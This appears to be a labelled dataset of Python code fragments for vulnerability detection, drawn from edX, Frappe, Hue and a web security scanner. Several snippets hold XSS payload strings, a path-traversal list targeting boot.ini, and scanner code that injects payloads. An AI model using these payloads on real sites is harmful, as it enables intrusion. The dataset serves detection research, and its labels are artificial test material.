urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 23804, "code": ".assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual", "label": 0}, {"snippet_id": 44736, "code": "'copiedProperties', '{}')) _properties=dict(NODES[node['widgetType']].get_fields()) _properties.update(dict([(_property['name'], _property['value']) for _property in properties])) if copied_properties:", "label": 0}, {"snippet_id": 28830, "code": " username=ssh_user_name, pkey=k) \t\telse: \t\t\tssh.connect(hostname=serv, port= ssh_port, username=ssh_user_name, password=ssh_user_password) \t\treturn ssh \texcept paramiko.AuthenticationException: \t\treturn", "label": 0}, {"snippet_id": 44873, "code": " response={'status': -1} try: workflow=Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) response['status']=0 response['parameters']=workflow.find_all_parameters", "label": 0}, {"snippet_id": 23198, "code": ">[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name", "label": 0}, {"snippet_id": 32991, "code": " relpath) with codecs.open(path, encoding='utf-8') as fp: return fp.read() def _WriteHeader(self, content_type='text/plain', status_code=200): self.send_response(status_code) self.send_header('Content-Type',", "label": 0}, {"snippet_id": 37754, "code": ") if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content", "label": 0}, {"snippet_id": 29747, "code": "'configs', 'haproxy_save_configs_dir'), format='cfg', **kwargs): \timport glob \tfile=set() \treturn_files=set() \t \tfor files in glob.glob(os.path.join(dir,'*.'+format)):\t\t\t\t \t\tfile.add(files.split('/')[-1]", "label": 0}, {"snippet_id": 19103, "code": ".test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest", "label": 0}, {"snippet_id": 34328, "code": "\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self", "label": 0}, {"snippet_id": 36516, "code": " False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=", "label": 0}, {"snippet_id": 42767, "code": "\"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns", "label": 0}, {"snippet_id": 14453, "code": "/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status", "label": 0}, {"snippet_id": 15550, "code": ".xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then", "label": 0}, {"snippet_id": 39575, "code": ".docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg(df): \t\t\tif df.fieldtype==", "label": 0}, {"snippet_id": 16360, "code": ".MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r", "label": 0}, {"snippet_id": 24761, "code": "={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from", "label": 0}, {"snippet_id": 54303, "code": ".Combobox(main, values=range(1,61)) timeout.current(14) global user_agent user_agent=ttk.Combobox(main, values=ua) user_agent.current(1) global payload payload=ttk.Combobox(main, values=pl) payload.current(0", "label": 0}, {"snippet_id": 38564, "code": " classname): \t\t\t\t_class=getattr(module, classname) \t\t\t\tif issubclass(_class, BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError", "label": 0}, {"snippet_id": 31134, "code": "\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip+\" \"+kp]) \tfunct.ssh_command(slave,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"", "label": 0}, {"snippet_id": 47748, "code": " action_save_user(request: HttpRequest, default_forward_url: str=\"/admin/users\"): \"\"\" This functions saves the changes to the user or adds a new one. It completely creates the HttpResponse :param request", "label": 0}, {"snippet_id": 25976, "code": "'is_business', 'company', 'name_parts', 'street', 'zipcode', 'city', 'country', 'vat_id', 'internal_reference', 'beneficiary') widgets={ 'is_business': BusinessBooleanRadio, 'street': forms.Textarea(attrs=", "label": 0}, {"snippet_id": 34310, "code": " update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get", "label": 0}, {"snippet_id": 530, "code": "(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return", "label": 1}, {"snippet_id": 667, "code": ": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) return def xss_get_uri(url,method,headers,body,scanid=None): db_update", "label": 1}, {"snippet_id": 54580, "code": "(FormView): \"\"\"\u6ce8\u518c\u9875\u9762\u3002\u4f7f\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u521b\u5efa\u7528\u6237\u8868\u5355\u3002\"\"\" template_name='register.html' form_class=UserCreationForm success_url='/login/' def form_valid(self, form): \"\"\"\u6821\u9a8c\u6210\u529f\uff0c\u4fdd\u5b58\u7528\u6237\u3002\"\"\" form.save() return super().form_valid(form)", "label": 0}, {"snippet_id": 9256, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter", "label": 0}, {"snippet_id": 31833, "code": "\"w\") as file: \t\t\tfile.write(form.getvalue('bwlists_content')) \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n save '+form.getvalue('color')+' list. %s </div>' % e)", "label": 0}, {"snippet_id": 53842, "code": ") parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str(input(\"[Input Script] >_ \")) print(str(result) +\"'\" +\"<marquee style='background:red'>\" ", "label": 1}, {"snippet_id": 25064, "code": " print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf", "label": 0}, {"snippet_id": 7291, "code": ".views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views", "label": 0}, {"snippet_id": 49147, "code": ".split('.'): c=column.replace(\"-\", \"\") if not int(c)==self.column_id: new_query.append(column) if not self.is_reverse() and self.current_columns[0]==self.column_id: return self.get_url_with_query_params({", "label": 0}, {"snippet_id": 14890, "code": " should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\"", "label": 0}, {"snippet_id": 38937, "code": " \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus", "label": 0}, {"snippet_id": 19021, "code": "', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include", "label": 0}, {"snippet_id": 54796, "code": "=self.request.user a.save() return super().form_valid(form) class ArticleUpdateView(UserPassesTestMixin, UpdateView): \"\"\"\u5904\u7406\u66f4\u65b0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article success_url='/' fields=['content', 'category']", "label": 0}, {"snippet_id": 36631, "code": "('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro", "label": 0}, {"snippet_id": 40778, "code": ".get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast", "label": 0}, {"snippet_id": 48088, "code": "(high_res_file_name, 'wb+') as destination: for chunk in file.chunks(): destination.write(chunk) original=Image.open(high_res_file_name) width, height=original.size diameter=math.sqrt(math.pow(width, 2) +math.pow", "label": 0}, {"snippet_id": 40884, "code": ")): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse", "label": 0}, {"snippet_id": 20306, "code": " being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\"", "label": 0}, {"snippet_id": 17157, "code": ".views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include", "label": 0}, {"snippet_id": 48099, "code": "=Image.open(high_res_file_name) width, height=original.size diameter=math.sqrt(math.pow(width, 2) +math.pow(height, 2)) width /=diameter height /=diameter width *=IMAGE_SCALE height *=IMAGE_SCALE cropped", "label": 0}, {"snippet_id": 4924, "code": "\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm", "label": 0}, {"snippet_id": 51017, "code": " to the horrifically designed absolute nightmare format Crontab. Crontab would be half-great if the parameters where named. Get your crontab guru going, this is the only way you'll understand what you're", "label": 0}, {"snippet_id": 9952, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings", "label": 0}, {"snippet_id": 30413, "code": "'waf') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \t", "label": 0}, {"snippet_id": 12981, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings", "label": 0}, {"snippet_id": 2162, "code": " decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url,", "label": 0}, {"snippet_id": 39939, "code": "\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_", "label": 0}, {"snippet_id": 22138, "code": ".MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"),", "label": 0}, {"snippet_id": 27195, "code": " =re.match(r'.*\\<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I) if m_action or m_same: has_form=1 form_counter+=1 if m_same: page=\"\" else: page=m_action.group(1) rtype=\"get\" if m_reqtype: rtype=m_reqtype", "label": 1}, {"snippet_id": 2005, "code": " host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\":", "label": 0}, {"snippet_id": 24693, "code": "(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers", "label": 0}, {"snippet_id": 1546, "code": " api=\"Y\" scan_status=scan_single_api(url, method, headers, body, api, scanid) if scan_status is True: msg={\"status\": scanid} try: db.scanids.insert({\"scanid\": scanid, \"name\": name, \"url\": url}) except:", "label": 0}, {"snippet_id": 50364, "code": " when the client is sending data to the server. Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) sess=self.sessionhandler", "label": 0}, {"snippet_id": 49904, "code": " two components running on twisted and django. They are both a part of the Evennia website url tree(so the testing website might be located on http://localhost:4001/, whereas the webclient can be found", "label": 0}, {"snippet_id": 46075, "code": " access it.\")) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} if request.method=='GET': if 'q' in request.GET: query['qs'][0]['q']=request.GET.get('q') if 'qd' in request.GET: query['qd']=request.GET.get('qd", "label": 1}, {"snippet_id": 23623, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings", "label": 0}, {"snippet_id": 35074, "code": "['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c", "label": 0}, {"snippet_id": 36668, "code": " self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t", "label": 0}, {"snippet_id": 18640, "code": "/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views", "label": 0}, {"snippet_id": 49282, "code": " self.field_name.startswith(\"_\") and self.field_name !=\"__str__\": raise SmartListException(\"Cannot use underscore(_) variables/functions in smart lists\") try: self.model_field=self.model._meta.get_field", "label": 0}, {"snippet_id": 46306, "code": ": collections, 'layout':[ {\"size\":12,\"rows\":[{\"widgets\":[ {\"size\":12,\"name\":\"Grid Results\",\"id\":\"52f07188-f30f-1296-2450-f77e02e1a5c0\",\"widgetType\":\"resultset-widget\", \"properties\":{},\"offset\":0,\"isLoading", "label": 0}, {"snippet_id": 14394, "code": "'ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate", "label": 0}, {"snippet_id": 18320, "code": "'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>", "label": 1}, {"snippet_id": 32941, "code": "%s/</a><br/>\\n' % (self.path.rstrip('/'), d, d)) break self.wfile.write('</div>') self._WriteTemplate('footer.html') def _DoImage(self, full_path, mime_type): self._WriteHeader(mime_type) with open(full_path", "label": 1}, {"snippet_id": 35801, "code": " is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc", "label": 0}, {"snippet_id": 42956, "code": "\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df", "label": 0}, {"snippet_id": 1427, "code": " vul_list @app.route('/alerts/<scanid>', methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"", "label": 0}, {"snippet_id": 16122, "code": "), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template", "label": 0}, {"snippet_id": 47490, "code": "=CheckEnum.CHECKED)) else: m: CheckEnum=CheckEnum.CHECKED if not profile.active: m=CheckEnum.NOT_CHECKED f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=m)) if profile: f.add_content(PlainText", "label": 0}, {"snippet_id": 21084, "code": ".course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 392, "code": ")%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request", "label": 0}, {"snippet_id": 52951, "code": ": coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) workflows=[dict([('uuid', d.content_object.uuid", "label": 0}, {"snippet_id": 45817, "code": "'] for b in bundle.data['coordinators']])]) for i, bundled in enumerate(bundle.data['coordinators']): coord=coords[bundled['coordinator']] workflow=Workflow(document=coord.dependencies.all()[0]) wf_dir", "label": 0}, {"snippet_id": 32424, "code": ", so we can emulate the way how Gitiles converts header titles to URL anchors. Gitiles' official documentation about the conversion is at: https://gerrit.googlesource.com/gitiles/+/master/Documentation", "label": 0}, {"snippet_id": 26749, "code": "%2fboot%2eini', '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00', '../../../../../boot.ini%00', '../../../../../../boot.ini%00', '../../../../../../../boot.ini%00', '../../../../../../", "label": 0}, {"snippet_id": 20794, "code": " url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done", "label": 0}, {"snippet_id": 7403, "code": "(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern", "label": 0}, {"snippet_id": 54333, "code": ", values=prox) global refresh refresh=ttk.Combobox(main, values=[\"On\", \"Off\"]) global crawl crawl=ttk.Combobox(main, values=[\"On\", \"Off\"]) target.grid(row=0, column=1) target.config(width=30) cookie.grid", "label": 0}, {"snippet_id": 9265, "code": "(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index", "label": 0}, {"snippet_id": 8973, "code": "<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license", "label": 0}, {"snippet_id": 51169, "code": ".site.unregister(PeriodicTask) admin.site.unregister(CrontabSchedule) admin.site.register(PeriodicTask, IEPeriodicTaskAdmin) admin.site.register(CrontabSchedule, IECrontabSchedule) class DashboardUserInline", "label": 0}, {"snippet_id": 23837, "code": "'tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store", "label": 0}, {"snippet_id": 44099, "code": ".search.documents import PageDocument @pytest.mark.django_db @pytest.mark.search class TestXSS: def test_facted_page_xss(self, client, project): query='XSS' page_search=PageDocument.faceted_search(query", "label": 0}, {"snippet_id": 13812, "code": "\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware", "label": 0}, {"snippet_id": 50661, "code": " for the disconnect. \"\"\" csession=self.get_client_session() if csession: csession[\"webclient_authenticated_uid\"]=None csession.save() self.logged_in=False self.client.lineSend(self.csessid,[\"connection_close", "label": 0}, {"snippet_id": 19502, "code": "\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir", "label": 0}, {"snippet_id": 4993, "code": " '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns", "label": 0}, {"snippet_id": 21147, "code": "]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'),", "label": 0}, {"snippet_id": 50715, "code": ".data_out(self, **kwargs) def send_text(self, *args, **kwargs): \"\"\" Send text data. This will pre-process the text for color-replacement, conversion to html etc. Args: text(str): Text to send. Kwargs: options", "label": 0}, {"snippet_id": 20989, "code": "/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key", "label": 0}, {"snippet_id": 21473, "code": ".progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 10914, "code": " traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py", "label": 0}, {"snippet_id": 16974, "code": "/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading", "label": 0}, {"snippet_id": 552, "code": ".append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact", "label": 1}, {"snippet_id": 28779, "code": "\tssh_enable='' \tssh_port='' \tssh_user_name='' \tssh_user_password='' \t \tfor sshs in sql.select_ssh(serv=serv): \t\tssh_enable=sshs[3] \t\tssh_user_name=sshs[4] \t\tssh_user_password=sshs[5] \t\tssh_key_name=fullpath+'", "label": 0}, {"snippet_id": 24030, "code": ", procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes", "label": 0}, {"snippet_id": 49773, "code": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js\"></script> <script> ''' html=html+\"var socket=io.connect('http://{}:{}');\".format(HOST,PORT) html=html+''' try{setTimeout", "label": 0}, {"snippet_id": 23631, "code": "', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404", "label": 0}, {"snippet_id": 4477, "code": " __init__(self): super(Code, self).__init__() @staticmethod def fuzzAscii(): for i in xrange(256): yield chr(i) @staticmethod def fuzzUnicode(cnt=1): for i in xrange(cnt): yield unichr(random.randint(0, 0xffff", "label": 0}, {"snippet_id": 41325, "code": ") def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route)", "label": 0}, {"snippet_id": 49068, "code": " for col in self.query_order.replace(\"-\", \"\").split(\".\")] if self.query_order else[] self.current_columns_length=len(self.current_columns) @property def priority(self): if self.is_ordered(): return self", "label": 0}, {"snippet_id": 18541, "code": "'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$", "label": 0}, {"snippet_id": 38254, "code": ", limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions", "label": 0}, {"snippet_id": 31871, "code": "[2],[\"sudo mkdir \"+path]) \t\terror=funct.upload(server[2], path+\"/\"+form.getvalue('bwlists_save'), list, dir='fullpath') \t\tif error: \t\t\tprint('<div class=\"alert alert-danger\">Upload fail: %s</div>' % error", "label": 0}, {"snippet_id": 47790, "code": " not request.user.is_authenticated: return HttpResponseForbidden() profile=Profile.objects.get(authuser=request.user) if profile.rights < 2: return HttpResponseForbidden() try: if request.GET.get(\"user_id", "label": 0}, {"snippet_id": 12023, "code": "<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views", "label": 0}, {"snippet_id": 21060, "code": "'^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 0}, {"snippet_id": 43236, "code": "\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t", "label": 0}, {"snippet_id": 2748, "code": "() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse", "label": 0}, {"snippet_id": 50109, "code": ".last_alive.iteritems() if now -t > _KEEPALIVE) for csessid, remove in keep_alives: if remove: to_remove.append(csessid) else: self.last_alive[csessid]=(now, True) self.lineSend(csessid,[\"ajax_keepalive\",[", "label": 0}, {"snippet_id": 37552, "code": "\"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name,", "label": 0}, {"snippet_id": 31989, "code": ".protocol_version=ldap.VERSION3 \t\tl.set_option(ldap.OPT_REFERRALS, 0) \t\tbind=l.simple_bind_s(user, password) \t\tcriteria=\"(&(objectClass=user)(sAMAccountName=\"+username+\"))\" \t\tattributes=[ldap_search_field]", "label": 0}, {"snippet_id": 52247, "code": " required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(type='oozie-workflow2', id=job['id']) name=doc2.name +'-copy' copy_doc=doc2.doc.get().copy(name=name", "label": 0}, {"snippet_id": 45955, "code": "\"temp\"],\"klass\":\"card card-home card-column span2\"}, {\"size\":10,\"rows\":[{\"widgets\":[ {\"size\":12,\"name\":\"Filter Bar\",\"widgetType\":\"filter-widget\", \"id\":\"99923aef-b233-9420-96c6-15d48293532b\", \"properties\"", 